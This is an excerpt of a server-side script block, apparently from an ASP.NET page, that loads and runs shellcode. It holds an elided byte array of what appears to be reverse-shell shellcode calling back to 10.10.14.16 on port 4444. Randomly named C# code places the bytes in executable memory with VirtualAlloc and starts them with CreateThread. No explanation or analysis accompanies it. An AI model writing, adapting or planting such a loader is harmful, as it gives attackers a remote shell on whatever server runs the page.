...
0x68,0x0a,0x0a,0x0e,0x10,0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,
...
0xc3,0x29,0xc6,0x75,0xc1,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
        ...
        IntPtr gAh7TIn = VirtualAlloc(IntPtr.Zero,(UIntPtr)hYi.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(hYi,0,gAh7TIn,hYi.Length);
        IntPtr lNy = IntPtr.Zero;
        IntPtr d6kBW7u1WAPe = CreateThread(IntPtr.Zero,UIntPtr.Zero,gAh7TIn,IntPtr.Zero,0,ref lNy);
    }
</script>
